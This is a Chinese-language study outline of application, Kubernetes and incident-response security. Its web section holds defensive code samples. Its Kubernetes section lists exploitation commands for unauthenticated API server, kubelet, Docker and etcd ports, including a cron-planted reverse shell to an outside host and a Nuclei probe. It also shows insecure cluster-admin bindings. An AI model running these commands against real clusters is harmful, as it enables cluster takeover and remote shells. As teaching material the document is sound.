# 目录

- [**1. 基础应用安全**](#1-基础应用安全)
  - [**1.1 Web安全**](#11-web安全)
    - [**1.1.1 SQL注入**](#111-sql注入)
    - [**1.1.2 跨站脚本（XSS）**](#112-跨站脚本xss)
    - [**1.1.3 跨站请求伪造（CSRF）**](#113-跨站请求伪造csrf)
    - [**1.1.4 服务端请求伪造（SSRF）**](#114-服务端请求伪造ssrf)
    - [**1.1.5 命令注入（Command Injection）**](#115-命令注入command-injection)
    - [**1.1.6 文件包含漏洞（LFI/RFI）**](#116-文件包含漏洞lfirfi)
    - [**1.1.7 路径穿越（Path Traversal）**](#117-路径穿越path-traversal)
    - [**1.1.8 浏览器安全（安全机制与响应头）**](#118-浏览器安全安全机制与响应头)
  - [**1.2 代码审计**](#12-代码审计)
    - [**静态代码分析（SAST）**](#静态代码分析sast)
    - [**动态代码分析（DAST）**](#动态代码分析dast)
    - [**安全代码编写最佳实践**](#安全代码编写最佳实践)
  - [**1.3 身份验证与授权**](#13-身份验证与授权)
    - [**密码安全**](#密码安全)
    - [**多因素认证（MFA）**](#多因素认证mfa)
    - [**OAuth和OpenID Connect**](#oauth和openid-connect)
    - [**会话管理**](#会话管理)
  - [**1.4 数据安全**](#14-数据安全)
    - [**数据加密**](#数据加密)
    - [**数据泄露防护（DLP）**](#数据泄露防护dlp)
    - [**隐私保护（GDPR、CCPA）**](#隐私保护gdprccpa)
  - [**1.5 中间件与CMS安全**](#15-中间件与cms安全)
- [**2. 网络安全**](#2-网络安全)
  - [**2.1 网络协议安全**](#21-网络协议安全)
  - [**2.2 网络攻击防护**](#22-网络攻击防护)
  - [**2.3 网络设备安全**](#23-网络设备安全)
  - [**2.4 端口与服务安全**](#24-端口与服务安全)
  - [**2.5 常见高危端口**](#25-常见高危端口)
  - [**2.6 特定服务的安全**](#26-特定服务的安全)
- [**3. 云安全**](#3-云安全)
- [**4. 容器安全（Kubernetes与Docker）**](#4-容器安全kubernetes与docker)
  - [**4.1 Kubernetes**](#41-kubernetes)
    - [4.1.1 Api Server](#411-api-server)
    - [4.1.2 kubectl proxy(命令非服务)](#412-kubectl-proxy命令非服务)
    - [4.1.3 kubelet](#413-kubelet)
    - [4.1.4 Dashboard](#414-dashboard)
    - [4.1.5 Docker API](#415-docker-api)
    - [4.1.6 ETCD](#416-etcd)
    - [4.1.7 kube-controller-manager](#417-kube-controller-manager)
    - [4.1.8 kube-proxy](#418-kube-proxy)
    - [4.1.9 kube-scheduler](#419-kube-scheduler)
    - [4.1.10 cAdvisor](#4110-cadvisor)
  - [4.2 **Docker**](#42-docker)
- [**5. 风控**](#5-风控)
- [**6. 移动安全**](#6-移动安全)
- [**7. 应急响应**](#7-应急响应)
  - [7.1 事件发现](#71-事件发现)
  - [7.2 事件追踪](#72-事件追踪)
  - [7.3 事件分析](#73-事件分析)
  - [7.4 协调处理与应急响应](#74-协调处理与应急响应)

---

# **1. 基础应用安全**

## **1.1 Web安全**

### **1.1.1 SQL注入**

防御代码：参数化查询

```bash
def get_user_info(safe_username):
	conn = sqlite3.connect("test.db")
	cursor = conn.cursor()
	query = "SELECT * FROM users WHERE username = ?"
	cursor.execute(query, (safe_username,))
	result = cursor.fetchall()
	conn.close()
	return result
```

### **1.1.2 跨站脚本（XSS）**

防御代码：Flask 中常用的模板引擎 Jinja2 默认会对模板中的变量输出进行 HTML 自动转义

```bash
<p>{{ user_input }}</p>
```

### **1.1.3 跨站请求伪造（CSRF）**

防御代码：为每个用户会话或表单生成一个随机CSRF TOKEN用于验证，有很多框架已内置这种防护手段，例如 Flask 的 Flask-WTF

```bash
from flask import Flask, render_template, request, redirect, url_for
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField

app = Flask(__name__)
app.secret_key = '你的密钥'
csrf = CSRFProtect(app)

class MyForm(FlaskForm):
    username = StringField('用户名')
    submit = SubmitField('提交')

@app.route('/submit', methods=['GET', 'POST'])
def submit():
    form = MyForm()
    if form.validate_on_submit():
        # 处理业务逻辑
        return redirect(url_for('success'))
    return render_template('form.html', form=form)

@app.route('/success')
def success():
    return "提交成功！"

if __name__ == '__main__':
    app.run(debug=True)
```

### **1.1.4 服务端请求伪造（SSRF）**

防御代码：

1、多次解析比较结果是否相同

2、白名单访问域名

3、黑名单访问IP（云服务内网地址）

```bash
import requests
import socket
import time
import ipaddress
import dns.resolver  # 需要安装 dnspython： pip install dnspython
from urllib.parse import urlparse

def get_ips(domain):
    """利用 dnspython 获取域名对应的所有 A 记录 IP"""
    try:
        answers = dns.resolver.resolve(domain, 'A')
        return sorted([str(rdata) for rdata in answers])
    except Exception as e:
        raise ValueError(f"解析域名 {domain} 时出错: {e}")

def is_private_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
    except Exception:
        return True  # 无法解析的 IP，视为不安全

def safe_fetch_url(url, allowed_domains=["example.com", "api.example.com"], delay=2):
    """
    1. 检查域名是否在允许列表中。
    2. 进行 DNS 解析，判断解析结果不包含内网 IP。
    3. 延时后再次解析，确保解析结果未变化（防止 DNS 重绑定）。
    """
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    # 检查域名白名单
    if hostname not in allowed_domains:
        raise ValueError("域名不在允许列表中")

    # 第一次 DNS 解析
    initial_ips = get_ips(hostname)
    for ip in initial_ips:
        if is_private_ip(ip):
            raise ValueError(f"初次解析发现禁止访问的内网 IP: {ip}")

    # 等待一定时间后再次解析
    time.sleep(delay)
    subsequent_ips = get_ips(hostname)
    if initial_ips != subsequent_ips:
        raise ValueError("检测到 DNS 重绑定风险：初次解析 IP 与后续解析 IP 不一致")
    
    # 附加检查：明确屏蔽常见云服务内网地址
    blocked_ips = ["169.254.169.254"]  # AWS 元数据服务示例，可根据情况增加
    for ip in subsequent_ips:
        if ip in blocked_ips:
            raise ValueError(f"禁止访问云环境内部敏感地址: {ip}")

    # 发起请求
    response = requests.get(url, timeout=5)
    return response.text
```

### **1.1.5 命令注入（Command Injection）**

防御代码：以列表的方式传递命令及其参数而不启用shell

```bash
def safe_execute(p):
	subprocess.run(["ls",p])
```

### **1.1.6 文件包含漏洞（LFI/RFI）**

同下

### **1.1.7 路径穿越（Path Traversal）**

防御代码：os.path.abspath 将路径转化为绝对路径，内部会对路径进行规范化

```bash
def safe_read_file(filename):
	base_dir = os.path.abspath('/var/app/data')
	request_path = os.path.abspath(os.path.join(base_dir,filename))
	#白名单校验：
	if not request_path.startswith(base_dir):
		return
	with open(request_path, 'r') as f:
		content = f.read()
	return content
```

### **1.1.8 浏览器安全（安全机制与响应头）**

**同源策略（Same Origin Policy, SOP）**

- 同源：同协议、端口、域名
- 策略：限制跨域数据访问，防止恶意网站窃取敏感信息（XSS、CSRF）

**跨域资源共享（CORS）**

CORS是为了应对上述的同源策略严格限制而设计的机制。通过在HTTP响应头中添加一些字段如Access-Control-Allow-Origin、Access-Control-Allow-Methods来实现功能：确保只有来自指定源的请求可以跨域访问后端 API。

```bash
response.headers['Access-Control-Allow-Origin'] = 'https://example.com'
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
```

**内容安全策略（CSP）**

通过在HTTP响应头中添加字段 Content-Security-Policy 来限制页面可以加载哪些外部资源（脚本、样式、图片等）。这样可以有效防止 XSS 攻击及其它资源注入问题。

```bash
csp_policy = (
        "default-src 'self'; "
        "script-src 'self' https://trustedscripts.example.com; "
        "style-src 'self'; "
        "img-src 'self' data:;"
    )
response.headers['Content-Security-Policy'] = csp_policy
```

**其它重要的安全响应头**

•	**X-Frame-Options：**

这个头设计出来就是为了防止点击劫持（Clickjacking）的，禁止或限制页面被嵌入到 <iframe> 中。常见配置有 DENY 或 SAMEORIGIN。

```bash
response.headers['X-Frame-Options'] = 'SAMEORIGIN'
```

•	**X-XSS-Protection：**

启用浏览器内置的 XSS 过滤器，配置为 1; mode=block 可以在检测到 XSS 攻击时阻止页面渲染。

```bash
response.headers['X-XSS-Protection'] = '1; mode=block'
```

•	**X-Content-Type-Options：**

禁用浏览器的 MIME 类型嗅探（MIME Sniffing），确保浏览器按照服务器声明的 Content-Type 解析内容，从而防止某些内容被误解释为可执行代码。

```bash
response.headers['X-Content-Type-Options'] = 'nosniff'
```

**总结：**

```bash
def set_security_headers(response):
    # CSP 策略
    csp_policy = (
        "default-src 'self'; "
        "script-src 'self' https://trustedscripts.example.com; "
        "style-src 'self'; "
        "img-src 'self' data:;"
    )
    response.headers['Content-Security-Policy'] = csp_policy
    # 防点击劫持
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # XSS 过滤
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # 禁止 MIME 嗅探
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

## **1.2 代码审计**

### **静态代码分析（SAST）**

### **动态代码分析（DAST）**

### **安全代码编写最佳实践**

## **1.3 身份验证与授权**

### **密码安全**

### **多因素认证（MFA）**

### **OAuth和OpenID Connect**

### **会话管理**

## **1.4 数据安全**

### **数据加密**

### **数据泄露防护（DLP）**

### **隐私保护（GDPR、CCPA）**

## **1.5 中间件与CMS安全**

# **2. 网络安全**

## **2.1 网络协议安全**

## **2.2 网络攻击防护**

## **2.3 网络设备安全**

## **2.4 端口与服务安全**

## **2.5 常见高危端口**

## **2.6 特定服务的安全**

# **3. 云安全**

# **4. [容器安全](https://github.com/neargle/my-re0-k8s-security?tab=readme-ov-file#7-%E5%AE%B9%E5%99%A8%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E7%BB%84%E4%BB%B6-api-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%88%96%E6%9C%AA%E9%89%B4%E6%9D%83)（Kubernetes与Docker）**

首先进行一些概念的介绍：

1. **容器（Container）**
    1. 具体概念：一台轻量级的服务器（包含对应的服务和环境依赖等）
    2. 抽象概念：运行在用户空间中的轻量级执行环境，确保应用在不同环境中的一致性。
2. **Pod**
    1. 具体概念：包含一个或多个容器
    2. 抽象概念：Kubernetes的调度单位，代表在同一环境中运行的一个或多个容器，通常用于表示一个服务的实例。
3. **Node**
    1. 具体概念：实际运行的计算机，是 Kubernetes 集群中的物理或虚拟机，
    2. 抽象概念：Kubernetes 集群中的一个工作节点
4. **namespace：**
    1. 具体概念：
        1. 在同一个node上
        - **Namespace: production**
            - **Pod**: frontend
            - **Pod**: backend
        - **Namespace: development**
            - **Pod**: frontend-dev (开发版前端)
            - **Pod**: backend-dev (开发版后端)
        1. 不同node上
        - **Namespace: production**
            - **Pod: frontend**（在 Node1 上运行）
            - **Pod: backend**（在 Node2 上运行）
        - **Namespace: development**
            - **Pod: frontend-dev**（在 Node1 上运行）
            - **Pod: backend-dev**（在 Node2 上运行）
    2. 抽象概念：一种逻辑分组，用于组织和隔离 Kubernetes 中的资源，每个 Namespace 可以包含多个 Pods 和其他资源（如 Services、Deployments 等）。
    
    k8s集群中的概念之间的关系：
    
    1. **容器（Container）**
        - 最小的执行单元，可以运行应用程序和其依赖项。每个容器共享操作系统内核，但在用户空间中相互隔离。
        - 一个 Pod 可以包含一个或多个容器。
    2. **Pod**
        - Kubernetes 中的基本调度单元，表示一组一个或多个容器，这些容器共享网络和存储。
        - Pod 中的容器可以相互通信，通常用于构成一个应用程序的不同部分。
    3. **Node**
        - Kubernetes 集群中的一个工作机器（物理或虚拟），用于运行 Pod。每个 Node 都有一个 Kubelet 代理来管理其上的 Pod。
        - 每个 Node 可以运行多个 Pod。
    4. **集群（Cluster）**
        - 由多个 Node 组成的集合，共同提供计算资源和服务。
        - Kubernetes 集群通常由控制平面和多个工作 Node 组成。
    5. **虚拟机（VM）**（可选）
        - 在某些情况下，Node 可以是虚拟机，通过虚拟化技术在物理计算机上运行。
        - 一台物理计算机可以托管多个虚拟机，每个虚拟机可以作为一个独立的 Node。
    6. **物理计算机（Physical Machine）**
        - 实际的硬件设备，可以运行虚拟化软件来创建多个虚拟机（Nodes），并在这些虚拟机上运行 Kubernetes 集群。
    
    总结起来就是：**容器** → **Pod** → **Node** → **集群** → **虚拟机** （可选）→ **物理计算机**。
    

## **4.1 Kubernetes**

如下是可能会出现漏洞或其他问题的，服务组件端口和相关配置操作：

| 服务 | 端口号 | 简介 |
| --- | --- | --- |
| Api Server | 6443 (HTTPS需要认证)
8080 (HTTP无需认证) | 集群的控制平面，提供管理、调度和操作集群的 REST API。（端口默认） |
| kubectl proxy（命令非服务） | N/A | 代理服务器，将 API 请求转发到 Kubernetes 集群。（端口自定义） |
| kubelet | 10250
10255 | 负责在每个节点（Node）上管理和运行容器。Kubelet 是每个节点上的代理程序，确保容器按照定义的 Pod 配置运行，并与 Kubernetes 集群的控制平面（API Server）进行通信。10250 用于安全通信，10255 是非安全端口。 |
| Dashboard | 30000 | Web UI。 |
| Docker API | 2375 | Docker 引擎的 HTTP 接口，用于管理容器。 |
| ETCD | 2379
2380 | Kubernetes 的分布式键值存储，用于存储集群数据。2379 为客户端通信端口，2380 用于集群成员之间的通信。 |
| kube-controller-manager | 10252 | 负责控制集群状态的组件，管理控制循环逻辑。 |
| kube-proxy | 10256
31442 | 负责管理节点网络流量的负载均衡与路由。10256 是默认控制端口，31442 用于服务间通信。 |
| kube-scheduler | 10251
10259 | 负责将调度的工作负载分配到合适的节点。 |
| cAdvisor | 4194 | Contrainer metrics |

接下来是具体的漏洞和相关问题介绍，以及最佳安全实践。

### 4.1.1 Api Server

Kubernetes API Server（API服务器）是Kubernetes集群的中央组件，提供RESTful API，允许用户、客户端和其他组件与集群交互，执行资源管理、身份验证、授权和状态查询等功能，是集群控制和管理的入口点。默认情况下 Api Server 在 8080 和 6443 两个端口上提供服务。

**8080未授权访问漏洞：**可控制已经创建的容器 && 新建 Pod 反弹 shell。

```bash
控制已创建的容器：
kubectl -s http://ip:8080 get pods -n default #在default的namespace下获取所有的pod
kubectl -s http://ip:8080 exec -it nginx-pod -n default bash #进入到并控制具体的pod
新建 Pod 反弹 shell：
kubectl -s http://ip:8080 create -f myapp.yaml #新建pod，并挂载上宿主机的/mnt.
kubectl -s http://ip:8080  exec -it myapp -n default bash #进入新建pod
echo '*/1 * * * * bash -c "bash -i >& /dev/tcp/ip/port 0>&1"' > /mnt/var/spool/cron/crontabs/root #写计划任务反弹宿主机的shell
```

**6443配置错误：**误将"system:anonymous"用户绑定到"cluster-admin"用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令（导致无需认证）。漏洞危害和利用同上。

配置错误的命令如下

```bash
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous
```

### 4.1.2 kubectl proxy(命令非服务)

如果在集群的 POD 上开放一个端口并用 ClusterIP Service 绑定创建一个内部服务，如果没有开放 NodePort 或 LoadBalancer 等 Service 的话，是无法在集群外网访问这个服务的（除非修改了 CNI 插件等）。如果想临时在本地和外网调试的话，kubectl proxy 是个不错的选择。而 kubectl proxy 转发的是 apiserver 所有的能力，而且是默认不鉴权的，所以 --address=0.0.0.0 就是极其危险的。

**配置错误**的命令如下

```bash
kubectl proxy --insecure-skip-tls-verify --accept-hosts='^.*$' --address='0.0.0.0'
```

### 4.1.3 kubelet

**10250未授权访问漏洞：**该端口在最新版 Kubernetes 是有鉴权的，但旧版本或错误的配置会导致问题的发生。

访问如下连接会返回相关数据则证明漏洞存在（下面会用到的数据%namespace%、%pod_name%、%container_name%）

```bash
https://ip:10250/pods
```

漏洞危害和利用如下（任意命令执行、反弹shel、寻找token进一步控制Api Server等等……）

```bash
curl -k -XPOST "https://k8s-node-1:10250/run/%namespace%/%pod_name%/%container_name%" -d "cmd="
```

**10255未授权访问漏洞：**本身为只读端口，开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面可能包含密码和秘钥等敏感信息。

```bash
/metrics;/metrics/cadvisor;/metrics/resource;/metrics/probes;/stats/summary;/pods;
试了下上述的api都可，其余被禁。具体细节见官网文档。
示例如下：
https://ip:10255/pods
```

### 4.1.4 Dashboard

两个**配置错误**

在deployment中开启enable-skip-login，那么就可以在登录界面点击跳过登录进dashboard；

```bash
--enable-skip-login
```

将默认的Kubernetes-dashboard绑定cluster-admin，拥有管理集群管权限

```bash
kubectl create clusterrolebinding dashboard-1 --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:kubernetes-dashboard
```

### 4.1.5 Docker API

**2375未授权访问漏洞：**

访问如下URL后， 观察路径是否含有 ContainersRunning、DockerRootDir 等关键字来判断漏洞是否存在

```bash
http://[host]:2375/info
```

可以使用如下方式控制目标 docker，后续利用手法同上（创建特权容器；挂载；写进计划任务或ssh公钥）

```bash
 docker -H tcp://[HOST]:2375 
```

### 4.1.6 ETCD

在安装完 K8s 后，默认会安装 etcd 组件，etcd 是一个高可用的 key-value 数据库，它为 k8s 集群提供底层数据存储，保存了整个集群的状态。

**未授权访问漏洞：**如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。

可利用如下Nuclei的yaml文件POC，来判断是否存在未授权访问，注意不同版本：v2和v3

```
- method: GET
  path:
    - "{{BaseURL}}/v2/keys/"

  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - '"node":'
        - '"dir":true'
      condition: and

    - type: word
      part: header
      words:
        - "application/json"

    - type: status
      status:
        - 200

- method: POST
  path:
    - "{{BaseURL}}/v3/kv/range"
  headers:
    Content-Type: application/json
  body: |
    {
      "key": "Lw=="
    }
  matchers:
    - type: word
      words:
        - "cluster_id"
        - "member_id"
      condition: and
    - type: status
      status:
        - 200
```

漏洞利用获取数据的话可以通过etcdctl，注意要根据目标（http还是https；v2版本还是v3版本）来对命令进行修改

```bash
etcdctl --endpoints= get / --prefix
```

### 4.1.7 kube-controller-manager

**10252端口未授权访问：**主要出现在 kube-controller-manager 暴露健康检查的 HTTP 服务上。默认情况下，该端口并不启用认证，因此未经授权的访问可能会导致敏感信息泄露，攻击者可以利用它来获取有关 kube-controller-manager 的状态、集群信息等，从而进一步加深对集群的了解。

访问如下URL来判断问题是否存在

```bash
http://<target-ip>:10252/metrics
http://<target-ip>:10252/healthz
```

### 4.1.8 kube-proxy

kube-proxy是一个运行在Kubernetes集群中每一个节点上的网络代理，它的任务就是管理Pods和服务之间的连接。Kubernetes服务会暴露一个clusterIP，并且可能由多个后端Pods组成以实现均衡负载。一个服务一般由三个Pods组成，每一个都拥有其自己的IP地址，但是它们只会暴露一个clusterIP，假设是“10.0.0.1”。Podas在访问目标服务时，会将数据包发送给它的clusterIP，也就是“10.0.0.1”，但随后数据包必须重定向给其中一个Pods。在这里，kube-proxy的作用就是为每一个节点提供路由表服务，这样才能保证请求能够正确路由至其中一个Pods。

CVE-2020-8558

### 4.1.9 kube-scheduler

**10251端口未授权访问：**健康检查接口（healthz），用于暴露 kube-scheduler 的健康状态信息。此端口使用 HTTP 协议，通常没有身份认证，因此未加保护的暴露可能导致信息泄露。

**10259端口未授权访问：**监控接口（metrics），用于暴露 kube-scheduler 的监控指标。此端口通常是 HTTPS，并默认限制为本地访问。

### 4.1.10 cAdvisor

cAdvisor（Container Advisor） 默认会在 4194 端口开放 Web 界面，用于监控容器的资源使用情况（如 CPU、内存、网络和磁盘使用等）。该服务通常在 Kubernetes 中被启用，用来为容器集群提供实时的性能数据。

**4194端口未授权访问：**访问如下URL即可查看主机上运行的容器状态信息

```bash
http://<host-ip>:4194
```

## 4.2 **Docker**

# **5. 风控**

# **6. 移动安全**

# **7. 应急响应**

## 7.1 事件发现

1、监控（SIEM、SOC、IDS、IPS等）与日志的异常

2、SDL 自动化生成的告警 or 其他手段工具发现的问题

3、威胁情报

## 7.2 事件追踪

1、时间线

2、优先级分类

## 7.3 事件分析

先理解为什么会有该安全事件，然后站在攻击者的角度，思考，我能干什么，一步一步复原整个过程。（这步我觉得最重要，分析得出漏洞的原因，以及造成的影响和危害，以及下面一个阶段的“我们接下来如何去做”）

## 7.4 协调处理与应急响应

1、一旦确认安全事件，立即启动应急预案，采取措施如隔离受感染系统、阻断攻击流量、封堵漏洞入口等。

2、与网络、运维、应用、容器等团队保持及时沟通，确保响应过程中各个环节的信息共享与配合。

3、在应急响应后，组织团队修复漏洞、清除后门，并确保系统安全恢复到正常状态。
